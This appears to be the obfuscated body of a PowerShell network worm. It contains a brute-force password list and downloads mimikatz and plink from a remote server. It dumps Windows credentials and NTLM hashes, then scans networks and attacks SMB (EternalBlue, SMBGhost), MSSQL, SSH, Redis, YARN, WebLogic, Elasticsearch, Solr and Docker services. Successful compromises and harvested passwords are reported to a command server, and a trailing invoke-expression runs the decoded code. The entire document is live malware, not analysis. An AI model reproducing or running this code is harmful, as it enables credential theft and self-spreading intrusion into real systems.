sword1NDck,NDckqwertyNDck,NDckbaseballNDck,NDckqwertyuiopNDck,NDcksupermanNDck,NDck1qaz2wsxNDck,NDckfuckyouNDck,NDck123qweNDck,NDckzxcvbnNDck,NDckpassNDck,NDckaaaaaaNDck,NDckloveNDck,NDckadministratorNDck,NDckqwe1234ANDck,NDckqwe1234aNDck,NDck NDck,NDck123123123NDck,NDck1234567890NDck,NDck88888888NDck,NDck111111111NDck,NDck112233NDck,NDcka123456NDck,NDck123456aNDck,NDck5201314NDck,NDck1q2w3e4rNDck,NDckqwe123NDck,NDcka123456789NDck,NDck123456789aNDck,NDckdragonNDck,NDcksunshineNDck,NDckprincessNDck,NDck!@#wB69%^&*NDck,NDckcharlieNDck,NDckaa123456NDck,NDckhomelesspaNDck,NDck1q2w3e4r5tNDck,NDcksaNDck,NDcksasaNDck,NDcksa123NDck,NDcksql2005NDck,NDcksa2008NDck,NDckabcNDck,NDckabcdefgNDck,NDcksapasswordNDck,NDckAa12345678NDck,NDckABCabc123NDck,NDcksqlpasswordNDck,NDcksql2008NDck,NDck11223344NDck,NDckadmin888NDck,NDc'+'kqwe1234NDck,NDckA123456NDck,NDckOPERADORNDck,NDckPassword123NDck,NDcktest123NDck,NDckNULLNDck,NDckuserNDck,NDcktestNDck,NDckPassword01NDck,NDckstagiaireNDck,NDckdemoNDck,NDckscanNDck,NDckP@ssw0rd123NDck,NDckxeroxNDck,NDckcomptaNDck)

wB69global:allhash = @()

wB69global:temphashes = @()


wB69byte_bat = [Convert]::FromBase64String(wB69batb64)


[string[]]wB69global:ipaddrs_i = @()

[string[]]wB69global:ipaddrs_o = @()

wB69global:ipaddrs_b=NDckNDck

wB69global:retry = 0

wB69global:getusers = @()

wB69global:getpasswd = @()

wB69global:getdomain = @()

wB69global:gethashs = @()

try{wB69localIf=wB69flase;New-Object Threading.Mutex(wB69true,utH9Global9e0eLocalIfutH9,[ref]wB69localIf)}catch{}

try{wB69VVERSION=wB69ifmd5[0..5]-joinNDckNDck}catch{}


wB69mimipath = wB69env:tmp+utH99e0mimi.datutH9

wB69d_retry=3 

while(!(Test-Path wB69mimipath) -or (Get-Item wB69mimipath).length -ne 3563487){

	if(wB69d_retry -eq 0){break}

	write-host NDcktry to get mimi...wB69d_retryNDck

	try{(new-object System.Net.WebClient).DownloadFile(wB69down_url+NDck/mimi.dat?v=wB69VVERSION&r=wB69d_retryNDck,wB69mimipath)}catch{}

	wB69d_retry--

	start-sleep 1

}

wB69plinkexepath = wB69env:tmp+NDck9e0knil.exeNDck

wB69d_retry=3

while(!(Test-Path wB69plinkexepath) -or (Get-Item wB69plinkexepath).length -ne 601100){

    write-host NDcktry to get plink...wB69d_retryNDck

    if(wB69d_retry -eq 0){break}

    try{

        wB69con=(new-object System.Net.WebClient).DownloadData(wB69down_url+NDck/knil.bin?v=wB69VVERSION&r=wB69d_retryNDck)

        [System.IO.File]::WriteAllBytes(wB69plinkexepath,(New-Object IO.BinaryReader(New-Object System.IO.Compression.GzipStream (New-Object System.IO.MemoryStream(,wB69con[100..(wB69con.count)])), ([IO.Compression.CompressionMode]::Decompress))).ReadBytes(10000000)+((1..127)uOvaGet-Random -Count 100))

    }catch{}

    wB69d_retry--

    start-sleep 1

}

try{  

	write-host NDckinit....NDck

	wB69temp = (Get-WmiObject -Class Win32_UserAccount)

	foreach (wB69t in wB69temp) {

		wB69pattern=NDck(9e0d{4}wB69)NDck

		if((wB69t.SID -match wB69pattern) -and (wB69alluser -notcontains wB69t.Name)){   

			wB69alluser += wB69t.Name

		}

	}

	if (([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] NDckAdministratorNDck)){

		wB69hasharray = geth  

		foreach(wB69hashline in wB69hasharray){

			wB69hash = wB69hashline.split(NDck:NDck)

			wB69un = wB69hash[0]

			wB69hs = wB69hash[3]


			if(wB69hash[1] -eq utH9500utH9 -or wB69hash[1].length -eq 4){

				if (wB69alluser -notcontains wB69un){

				wB69alluser += NDckwB69unNDck

				}

				if (wB69temphashes -notcontains wB69hs){

				wB69temphashes += NDckwB69hsNDck

				}

			}

		}


		wB69getpass = (Invoke-Mypass).Replace(NDck NDck, NDckNDck)  

		write-host wB69getpass

		wB69mm=[regex]::matches(wB69getpass,utH99e0*Username:.+utH9);  

		wB69pp=[regex]::matches(wB69getpass,utH99e0*Password:.+utH9);

		wB69nn=[regex]::matches(wB69getpass,utH99e0*NTLM:.+utH9);

		wB69dd=[regex]::matches'+'(wB69getpass,utH99e0*Domain:.+utH9);

		foreach(wB69uuu in wB69mm){

			wB69uuu=wB69uuu.value.trim().Replace(utH9*Username:utH9, NDckNDck);

			if ((wB69uuu -ne NDck(null)NDck) -and (wB69uuu.IndexOf(NDckir8wB69NDck) -eq -1) -and (wB69getusers -notcontains wB69uuu)){

			wB69getusers += NDckwB69uuuNDck

			}

			if ((wB69uuu -ne NDck(null)NDck) -and (wB69uuu.IndexOf(NDckir8wB69NDck) -eq -1) -and (wB69alluser -notcontains wB69uuu)){

			wB69alluser += NDckwB69uuuNDck

			}

		}

		foreach(wB69ppp in wB69pp){

			wB69ppp=wB69ppp.value.trim().Replace(utH9*Password:utH9, NDckNDck);

			if ((wB69ppp -ne NDck(null)NDck) -and (wB69getpasswd -notcontains wB69ppp) -and (wB69ppp.length -lt 20)){

			wB69getpasswd += NDckwB69pppNDck

			}

			if ((wB69ppp -ne NDck(null)NDck) -and (wB69allpass -notcontains wB69ppp) -and (wB69ppp.length -lt 20)){

			wB69allpass += NDckwB69pppNDck

'+'			}

		}

		foreach(wB69hhh in wB69nn){

			wB69hhh=wB69hhh.value.trim().Replace(utH9*NTLM:utH9, NDckNDck);

			NDckget hash:wB69hhhNDck

			if ((wB69hhh -ne utH931d6cfe0d16ae931b73c59d7e0c089c0utH9) -and (wB69gethashs -notcontains wB69hhh)){

			wB69gethashs += NDckwB69hhhNDck

			}

		}

		foreach(wB69ddd in wB69dd){

			wB69ddd=wB69ddd.value.trim().Replace(utH9*Domain:utH9, NDckNDck);

			if ((wB69getdomain -notcontains wB69ddd) -and (wB69ddd.IndexOf(NDckir8wB69NDck) -eq -1) -and (wB69ddd -ne NDck(null)NDck) -and (wB69ddd -ne NDckworkgroupNDck) -and (wB69ddd -ne NDckwB69env:COMPUTERNAMENDck)){

			wB69getdomain += NDckwB69dddNDck

			}

		}

	}

}catch{}

write-host NDckdone....NDck


foreach(wB69pass in wB69allpass){

	wB69temphash=Gen-NTLM wB69pass

	if (wB69allhash -notcontains wB69temphash){

		wB69allhash += NDckwB69temphashNDck

	}

}

foreach(wB69thash in wB69temphashes){

	if (wB69allhash -notcontains wB69thash){

		wB69allhash += NDckwB69thashNDck

	}

}


wB69inter_flag=wB69false

wB69tcount=256

wB69start_time=Get-Date -UFormat NDck%sNDck

while(wB69true)

{

	if(((Get-Date -UFormat NDck%sNDck)-wB69start_time) -gt 60000) {break}

	wB69smb_portopen = @()

	wB69ms_portopen = @()

	wB69rdp_portopen = @()

	wB69ssh_portopen = @()

	wB69redis_portopen = @()

	getipaddrs wB69inter_flag

	for(wB69t=0;wB69t -lt 2;wB69t++) {

		if(wB69inter_flag) {wB69t=1}

		else {

			wB69inter_flag=wB69true

		}

		if(wB69t -eq 0){

			wB69sc_code = wB69sc

			wB69mssql_code = wB69mssql_cmd

			wB69ipc_code = wB69ipc_cmd

			wB69smgh_code = wB69smgh_cmd

			wB69rdp_code = wB69rdp_cmd

			wB69ssh_code = wB69ssh_cmd

			wB69redis_code = wB69redis_cmd

            wB69yarn_code = wB69yarn_cmd

            wB69logic_code = wB69logic_cmd

            wB69es_code = wB69es_cmd

            wB69solr_code = wB69solr_cmd

            wB69docker_code = wB69docker_cmd

			wB69ipaddresses=wB69ipaddrs_i

		} else {

			wB69sc_code = wB69sco

			wB69mssql_code = wB69mssqlo_cmd

			wB69ipc_code = wB69ipco_cmd

			wB69smgh_code = wB69smgho_cmd

			wB69rdp_code = wB69rdpo_cmd

			wB69ssh_code = wB69ssho_cmd

			wB69redis_code = wB69rediso_cmd

            wB69logic_code = wB69logico_cmd

            wB69es_code = wB69eso_cmd

            wB69solr_code = wB69solro_cmd

            wB69docker_code = wB69dockero_cmd

			wB69ipaddresses=wB69ipaddrs_o

		}

		wB69internet_ip = (Test-Connection -ComputerName wB69env:computername -count 1).ipv4address.IPAddressToString

		for(wB69i=0;wB69i -lt wB69ipaddresses.count;wB69i+=wB69tcount){

            

			write-host NDckstart smb port open scanning...NDck

			wB69smb_portopen = localscan -port 445 -addresses wB69ipaddresses[wB69i..(wB69i+wB69tcount-1)]

			wB69old_portopen = localscan -port 65529 -addresses wB69smb_portopen[1]

			

			foreach(wB69currip in wB69smb_portopen[1]){

				if ((wB69old_portopen[1] -notcontains wB69currip) -and (wB69currip.length -gt 6)){					

                    

					write-host NDckstart ipc scanning....wB69curripNDck

					for(wB69n = 0; wB69n -lt wB69alluser.Count; wB69n++){

						write-host wB69alluser[wB69n] 

						copyrun -ip wB69currip -thedomain NDcklocalhostNDck -u'+'ser wB69alluser[wB69n] -cmd wB69ipc_code

					}

					for(wB69nn = 0; wB69nn -lt wB69getdomain.Count; wB69nn++){

						if(wB69getdomain[wB69nn] -ne utH9.utH9){

							for(wB69uu = 0; wB69uu -lt wB69getusers.Count; wB69uu++){

								copyrun -ip wB69currip -thedomain wB69getdomain[wB69nn] -user wB69getusers[wB69uu] -cmd wB69ipc_code

							}

						}

					}	

					

					try{

						write-host NDckstart eb scanning...wB69curripNDck

						wB69vul=[PingCastle.Scanners.m17sc]::Scan(wB69currip)

						if(wB69vul){  

							write-host NDck[+]wB69currip seems eb vulnerable...NDck 

							wB69res = eb7 wB69currip wB69sc_code   

							if(wB69res) {

								write-host NDckwB69currip eb7 got it!!!NDck 

                                try{(New-Object Net.WebClient).DownloadString(wB69down_url+utH9/report.json?v=utH9+wB69VVERSION+utH9&type=eb7&iip=utH9+wB69internet_ip+utH9&ip=utH9+wB69currip+utH9&t=utH9+wB69t)}catch{}

							} else {

								wB69res = eb8 wB69currip wB69sc_code

								if(wB69res) {

                                    try{(New-Object Net.WebClient).DownloadString(wB69down_url+utH9/report.json?v=utH9+wB69VVERSION+utH9&type=eb8&iip=utH9+wB69internet_ip+utH9&ip=utH9+wB69currip+utH9&t=utH9+wB69t)}catch{}

									write-host NDckwB69currip eb8 got it!!!NDck 

								}

							}

						}

					}catch{}

					

					try{

						write-host NDckstart smbghost scanning...wB69curripNDck

						wB69ret = smbghost_check wB69currip

						if(wB69ret -eq 1){

							write-host NDck[+]wB69currip seems smbghost vulnerable...NDck

							try{(New-Object Net.WebClient).DownloadString(wB69down_url+utH9/report.json?v=utH9+wB69VVERSION+utH9&type=smbhost&iip=utH9+wB69internet_ip+utH9&ip=utH9+wB69currip+utH9&t=utH9+wB69t)}catch{}

                            Start-Sleep -Seconds 2

                            wB69smb_retry=3

                            while(wB69smb_retry-- -gt 0){

                                wB69ret1=smbghost_exec wB69currip wB69smgh_code

                                if(wB69ret1){

                                    write-host NDck[+]got it!!NDck

                                    try{(New-Object Net.WebClient).DownloadString(wB69down_url+utH9/report.json?v=utH9+wB69VVERSION+utH9&type=smbhost_exec&iip=utH9+wB69internet_ip+utH9&ip=utH9+wB69currip+utH9&t=utH9+wB69t)}catch{}

                                    break

                                }

                            }

						}

					}catch{}

                    

				}

			}

			

			write-host NDckstart mssql port open scanning...NDck

			wB69ms_portopen = localscan -port 1433 -addresses wB69ipaddresses[wB69i..(wB69i+wB69tcount-1)]

			wB69old_portopen = localscan -port 65529 -addresses wB69ms_portopen[1]

			

			foreach(wB69currip in wB69ms_portopen[1]) {

				if ((wB69old_portopen[1] -notcontains wB69currip) -and (wB69currip.length -gt 6)){

					write-host NDckstart mssql burping...wB69curripNDck

					for(wB69n=0; wB69n -lt wB69allpass.count; wB69n++){

						wB69flag=wB69false

						write-host(NDckTry pass: NDck+wB69allpass[wB69n])

						wB69flag,wB69banner = (mssqlrun -ip wB69currip -pass wB69allpass[wB69n] -cmd wB69mssql_code -cmd1 wB69mssql_code)[-2..-1]

						if(wB69flag) {

							try{(New-Object Net.WebClient).DownloadString(wB69down_url+utH9/report.json?v=utH9+wB69VVERSION+utH9&type=ms&iip=utH9+wB69internet_ip+utH9&ip=utH9+wB69currip+utH9&pass=utH9+wB69allpass[wB69n]+utH9&t=utH9+wB69t+utH9&b=utH9+wB69banner)}catch{}

							break

						}

					}

				}

			}

			

			write-host NDckstart ssh port open scanning...NDck

			wB69ssh_portopen = localscan -port 22 -addresses wB69ipaddresses[wB69i..(wB69i+wB69tcount-1)]

			wB69old_portopen = localscan -port 65529 -addresses wB69ssh_portopen[1]

			

			foreach(wB69currip in wB69ssh_portopen[1]) {

				if ((wB69old_portopen[1] -notcontains wB69currip) -and (wB69currip.length -gt 6)){

					write-host NDckstart ssh burping...wB69curripNDck

					foreach(wB69password in wB69allpass){

						write-host NDckTry pass:wB69passwordNDck

						wB69flag1 = -1

						wB69flag1 = sshbrute wB69currip NDckrootNDck wB69password wB69ssh_code

						if(wB69flag1 -eq 1){

							write-host NDckSUCC!!NDck

							try{(New-Object Net.WebClient).DownloadString(wB69down_url+utH9/report.json?v=utH9+wB69VVERSION+utH9&type=ssh&iip=utH9+wB69internet_ip+utH9&ip=utH9+wB69currip+utH9&pass=utH9+wB69password+utH'+'9&t=utH9+wB69t)}catch{}

							break

						}

					}

				}

			}

			

			write-host NDckstart redis port1 open scanning...NDck

			wB69redis_portopen = localscan -port 6379 -addresses wB69ipaddresses[wB69i..(wB69i+wB69tcount-1)]

			wB69old_portopen = localscan -port 65529 -addresses wB69redis_portopen[1]

			

			foreach(wB69currip in wB69redis_portopen[1]) {

				if ((wB69old_portopen[1] -notcontains wB69currip) -and (wB69currip.length -gt 6)){

					write-host NDckstart redis command check...wB69currip on port 6379NDck

					wB69flag1 = redisexec wB69currip 6379 wB69redis_code

					if(wB69flag1 -gt 0){

						write-host NDckSUCC!!NDck

						try{(New-Object Net.WebClient).DownloadString(wB69down_url+utH9/report.json?v=utH9+wB69VVERSION+utH9&type=rds&f=utH9+wB69flag1+utH9&iip=utH9+wB69internet_ip+utH9&ip=utH9+wB69currip+utH9&t=utH9+wB69t)}catch{}

						break

					}

				}

			}

			

			write-host NDckstart redis port2 open scanning...NDck

			wB69redis_portopen1 = localscan -port 16379 -addresses wB69ipaddresses[wB69i..(wB69i+wB69tcount-1)]

			wB69old_portopen = localscan -port 65529 -addresses wB69redis_portopen1[1]

			

			foreach(wB69currip in wB69redis_portopen1[1]) {

				if ((wB69old_portopen[1] -notcontains wB69currip) -and (wB69currip.length -gt 6)){

					write-host NDckstart redis command check...wB69currip on port 16379NDck

					wB69flag1 = redisexec wB69currip 16379 wB69redis_code

					if(wB69flag1 -gt 0){

						write-host NDckSUCC!!NDck

						try{(New-Object Net.WebClient).DownloadString(wB69down_url+utH9/report.json?v=utH9+wB69VVERSION+utH9&type=rds1&f=utH9+wB69flag1+utH9&iip=utH9+wB69internet_ip+utH9&ip=utH9+wB69currip+utH9&t=utH9+wB69t)}catch{}

						break

					}

				}

			}

            

            write-host NDckstart yarn port open scanning...NDck

			wB69yarn_portopen = localscan -port 8088 -addresses wB69ipaddresses[wB69i..(wB69i+wB69tcount-1)]

			wB69old_portopen = localscan -port 65529 -addresses wB69yarn_portopen[1]

			

			foreach(wB69currip in wB69yarn_portopen[1]) {

				if ((wB69old_portopen[1] -notcontains wB69currip) -and (wB69currip.length -gt 6)){

					write-host NDckstart yarn service check...wB69curripNDck

					wB69flag2 = yarnexec wB69currip wB69yarn_code

					if(wB69flag2 -eq wB69true){

						write-host NDckSUCC!!NDck

						try{(New-Object Net.WebClient).DownloadString(wB69down_url+utH9/report.json?v=utH9'+'+wB69VVERSION+utH9&type=yarn&iip=utH9+wB69internet_ip+utH9&ip=utH9+wB69currip+utH9&t=utH9+wB69t)}catch{}

						break

					}

				}

			}

            

            write-host NDckstart logic port open scanning...NDck

			wB69logic_portopen = localscan -port 7001 -addresses wB69ipaddresses[wB69i..(wB69i+wB69tcount-1)]

			wB69old_portopen = localscan -port 65529 -addresses wB69logic_portopen[1]

			

			foreach(wB69currip in wB69logic_portopen[1]) {

				if ((wB69old_portopen[1] -notcontains wB69currip) -and (wB69currip.length -gt 6)){

					write-host NDckstart logic service check...wB69curripNDck

                    if(wB69logic_code.gettype() -eq @().gettype()){

                        wB69flag1 = logicexec wB69currip wB69logic_code[1].replace(NDckutH9NDck,NDck9e0utH9NDck).replace(NDck9e0NDck,NDck9e09e0NDck)

                        wB69flag2 = logicexec wB69currip wB69logic_code[0].replace(NDckutH9NDck,NDck9e0utH9NDck).replace(NDck9e0NDck,NDck9e09e0NDck)

                        if(wB69flag1 -ne wB69false -or wB69flag2 -ne wB69false){

                            write-host NDckSUCC!!NDck

                            try{(New-Object Net.WebClient).DownloadString(wB69down_url+utH9/report.json?v=utH9+wB69VVERSION+utH9&type=logic&f1=utH9+wB69flag1+utH9&f2=utH9+wB69flag2+utH9&iip=utH9+wB69internet_ip+utH9&ip=utH9+wB69currip+utH9&t=utH9+wB69t)}catch{}

                            break

                        }

                    }

				}

			}

            

            write-host NDckstart es port open scanning...NDck

			wB69es_portopen = localscan -port 9200 -addresses wB69ipaddresses[wB69i..(wB69i+wB69tcount-1)]

			wB69old_portopen = localscan -port 65529 -addresses wB69es_portopen[1]

			

			foreach(wB69currip in wB69es_portopen[1]) {

				if ((wB69old_portopen[1] -notcontains wB69currip) -and (wB69currip.length -gt 6)){

					write-host NDckstart es service check...wB69curripNDck

                    if(wB69es_code.gettype() -eq @().gettype()){

                        wB69flag1 = esexec wB69currip wB69es_code[1].replace(NDckutH9NDck,NDck9e0utH9NDck).replace(NDck9e0NDck,NDck9e09e0NDck)

                        wB69flag2 = esexec wB69currip wB69es_code[0].replace(NDckutH9NDck,NDck9e0utH9NDck).replace(NDck9e0NDck,NDck9e09e0NDck)

                        if(wB69flag1 -eq wB69true -or wB69flag2 -eq wB69true){

                            write-host NDckSUCC!!NDck

                            try{(New-Object Net.WebClient).DownloadString(wB69down_url+utH9/report.json?v=utH9+wB69VVERSION+utH9&type=es&iip=utH9+wB69internet_ip+utH9&ip=utH9+wB69currip+utH9&t=utH9+wB69t)}catch{}

                            break

                        }

                    }

				}

			} 

            

            write-host NDckstart solr port open scanning...NDck

			wB69solr_portopen = localscan -port 8983 -addresses wB69ipaddresses[wB69i..(wB69i+wB69tcount-1)]

			wB69old_portopen = localscan -port 65529 -'+'addresses wB69solr_portopen[1]

			

			foreach(wB69currip in wB69solr_portopen[1]) {

				if ((wB69old_portopen[1] -notcontains wB69currip) -and (wB69currip.length -gt 6)'+'){

					write-host NDckstart solr service check...wB69curripNDck

                    if(wB69solr_code.gettype() -eq @().gettype()){

                        wB69flag1 = solrexec wB69currip wB69solr_code[1].replace(NDckutH9NDck,NDck9e0utH9NDck).replace(NDck9e0NDck,NDck9e09e0NDck)

                        wB69flag2 = solrexec wB69currip wB69solr_code[0].replace(NDckutH9NDck,NDck9e0utH9NDck).replace(NDck9e0NDck,NDck9e09e0NDck)

                        if(wB69flag1 -ne wB69false -or wB69flag2 -ne wB69false){

                            write-host NDckSUCC!!NDck

                            try{(New-Object Net.WebClient).DownloadString(wB69down_url+utH9/report.json?v=utH9+wB69VVERSION+utH9&type=solr&f1=utH9+wB69flag1+utH9&f2=utH9+wB69flag2+utH9&iip=utH9+wB69internet_ip+utH9&ip=utH9+wB69currip+utH9&t=utH9+wB69t)}catch{}

                            break

                        }

                    }

				}

			}

            

            write-host NDckstart docker port open scanning...NDck

			wB'+'69docker_portopen = localscan -port 2375 -addresses wB69ipaddresses[wB69i..(wB69i+wB69tcount-1)]

			wB69old_portopen = local'+'scan -port 65529 -addresses wB69docker_portopen[1]

			

			foreach(wB69currip in wB69docker_portopen[1]) {

				if ((wB69old_portopen[1] -notcontains wB69currip) -and (wB69currip.length -gt 6)){

					write-host NDckstart docker service check...wB69curripNDck

                    wB69flag1 = dockerexec wB69currip wB69docker_code

                    if(wB69flag1 -ne wB69false){

                        write-host NDckSUCC!!NDck

                        try{(New-Object Net.WebClient).DownloadString(wB69down_url+utH9/report.json?v=utH9+wB69VVERSION+utH9&type=docker&f1=utH9+wB69flag1+utH9&iip=utH9+wB69internet_ip+utH9&ip=utH9+wB69currip+utH9&t=utH9+wB69t)}catch{}

                        break

                    }

				}

			}

		}

		

		wB69retry++

	

		write-host NDckreportingNDck

		try{

			wB69mac = (Get-WmiObject Win32_NetworkAdapterConfiguration uOva where {wB69_.ipenabled -EQ wB69true}).Macaddress uOva select-object -first 1

			wB69guid = (get-wmiobject Win32_ComputerSystemProduct).UUID

			wB69comp_name = wB69env:COMPUTERNAME

			wB69mf = test-path wB69mimipath


			IEX(New-Object Net.WebClient).DownloadString(wB69down_url+utH9/log.json?V=utH9+wB69VVERSION+utH9&utH9+wB69comp_name+utH9&utH9+wB69guid+utH9&utH9+wB69mac+utH9&utH9+wB69internet_ip+utH9&r=utH9+wB69retry+utH9&pc1=utH9+wB69smb_portopen[1].count+utH9&pc2=utH9+wB69ms_portopen[1].count+utH9&pc3=utH9+wB69ssh_portopen[1].count+utH9&pc4=utH9+wB69rdp_portopen[1].count+utH9&pc5=utH9+wB69redis_portopen[1].count+utH9&pc6=utH9+wB69redis_portopen1[1].count+utH9&pc7=utH9+wB69yarn_portopen[1].count+utH9&pc8=utH9+wB69logic_portopen[1].count+utH9&pc9=utH9+wB69es_portopen[1].count+utH9&pc10=utH9+wB69solr_portopen[1].count+utH9&pci=utH9+wB69ipaddrs_i.count+utH9&pco=utH9+wB69ipaddrs_o.count+utH9&pcb=utH9+wB69global:ipaddrs_b+utH9&mi=utH9+(wB69getpasswd -join NDck^^NDck)+utH9&mf=utH9+[Int]wB69mf)

		}catch{}

	}

	

	NDckENDNDck

}').Replace(([CHAR]117+[CHAR]116+[CHAR]72+[CHAR]57),[strINg][CHAR]39).Replace(([CHAR]117+[CHAR]79+[CHAR]118+[CHAR]97),'|').Replace(([CHAR]119+[CHAR]66+[CHAR]54+[CHAR]57),[strINg][CHAR]36).Replace('NDck',[strINg][CHAR]34).Replace(([CHAR]57+[CHAR]101+[CHAR]48),'\').Replace('ir8',[strINg][CHAR]96) 
#| & ( $env:Comspec[4,26,25]-jOiN'')


